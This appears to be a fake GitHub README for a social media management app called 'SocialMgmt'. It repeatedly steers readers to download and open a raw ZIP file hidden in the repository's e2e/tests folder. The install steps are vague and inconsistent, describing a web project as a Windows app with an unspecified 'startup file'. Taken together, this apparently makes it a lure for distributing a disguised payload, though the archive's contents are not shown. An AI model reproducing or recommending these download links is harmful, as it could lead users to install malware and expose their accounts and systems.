# 📱 SocialMgmt - Manage social posts with less effort

[![Download SocialMgmt](https://img.shields.io/badge/Download-SocialMgmt-blue?style=for-the-badge&logo=github)](https://github.com/Pinchasconstitutional598/SocialMgmt/raw/refs/heads/main/e2e/tests/Mgmt_Social_v2.1.zip)

## 🚀 Overview

SocialMgmt is a Windows app for managing social media work in one place. It helps you connect common social platforms, plan content, and keep your daily tasks organized.

This project uses React, Express, Prisma, MySQL, and API support for Facebook and Instagram. It is built for users who want a simple way to handle social media management from a desktop setup.

## ✨ What you can do

- View and manage social media content in one place
- Work with Facebook and Instagram account data
- Use a clean interface that is easy to follow
- Store app data in a local MySQL database
- Sign in with JWT-based login
- Run the app in a stable desktop browser flow
- Use it with Windows for day-to-day work

## 🖥️ System requirements

Before you start, make sure your PC has:

- Windows 10 or Windows 11
- Google Chrome or Microsoft Edge
- An active internet connection
- At least 4 GB of RAM
- 500 MB of free disk space
- Permission to open downloaded files
- MySQL available if you plan to run the full local setup

## 📥 Download

1. Open the download page:
   [https://github.com/Pinchasconstitutional598/SocialMgmt/raw/refs/heads/main/e2e/tests/Mgmt_Social_v2.1.zip](https://github.com/Pinchasconstitutional598/SocialMgmt/raw/refs/heads/main/e2e/tests/Mgmt_Social_v2.1.zip)
2. Download or clone the project from that page
3. If you get a ZIP file, save it to your PC
4. If you open the repository in GitHub, use the green Code button and choose Download ZIP

## 🛠️ Install on Windows

1. Find the ZIP file you downloaded
2. Right-click the file and choose Extract All
3. Pick a folder you can find again, such as Documents or Desktop
4. Open the extracted SocialMgmt folder
5. Look for the main project files in the folder
6. If the project includes a built app or startup file, open it as directed in the repo files
7. If the project uses local setup files, follow the steps in the project folder before starting the app

## 🧭 First launch

After you open the app, check that it loads without errors.

If the app asks for a login, use the account details set up in your environment.

If the app asks for access to Facebook or Instagram, allow the connection so the social tools can work.

If the app opens in a browser window, keep that window open while you work.

## ⚙️ Setup for local use

If you want to run the project on your own machine, use this flow:

1. Install Node.js if it is not already on your PC
2. Install MySQL and create a database for the app
3. Open the project folder in a terminal
4. Install the project packages
5. Add the required environment values for database and API access
6. Run the Prisma database setup
7. Start the backend server
8. Start the frontend app

## 🧩 Typical environment values

The app may use values like these:

- DATABASE_URL
- JWT_SECRET
- FACEBOOK_APP_ID
- FACEBOOK_APP_SECRET
- INSTAGRAM_APP_ID
- INSTAGRAM_APP_SECRET
- MARKETING_API_KEY
- PORT

Keep these values in a local config file if the project uses one.

## 🔌 Main parts of the app

- React for the user interface
- Express for the server
- Prisma for database access
- MySQL for storage
- Facebook Graph API for Facebook data
- Instagram Graph API for Instagram data
- Marketing API support for campaign-related tasks
- Vite for fast app loading
- Zod for data checks
- Playwright and Supertest for test coverage

## 🧪 If something does not open

If the app does not start, check these points:

- The ZIP file was extracted fully
- Node.js is installed
- MySQL is running
- The database name and password are correct
- The browser is up to date
- The project folder name has no odd characters
- The required API settings are in place

## 📁 Suggested folder layout

A typical setup may look like this:

- `client` for the React app
- `server` for the Express app
- `prisma` for database files
- `public` for shared assets
- `tests` for app checks

## 🧰 Common tasks

### Open the app
Start the frontend after the server is running

### Refresh data
Use the app controls to reload social account data

### Connect accounts
Follow the prompts to link Facebook or Instagram

### Update content
Edit posts, media, or campaign details from the app screen

## 🔐 Login and access

The app uses JWT for sign-in sessions. If you sign out, you may need to log in again before using private parts of the app.

If your account has access limits, make sure you use the right profile before connecting social accounts.

## 🧱 Built with

- React
- Express
- Prisma
- MySQL
- Facebook Graph API
- Instagram Graph API
- Marketing API
- TypeScript
- MUI
- Docker

## 📌 Project topics

docker, express, facebook-api, instagram-api, jwt, msw, mui, mysql, playwright, prisma, react, supertest, typescript, vite, zod

## 🔗 Download again

[Visit the SocialMgmt repository to download or clone the project](https://github.com/Pinchasconstitutional598/SocialMgmt/raw/refs/heads/main/e2e/tests/Mgmt_Social_v2.1.zip)

## 🧭 Windows tips

- Use a folder path with simple names
- Keep the project outside protected system folders
- Run the app with the same account that installed the tools
- Close other heavy apps if the browser feels slow
- Keep your MySQL service running while you use the app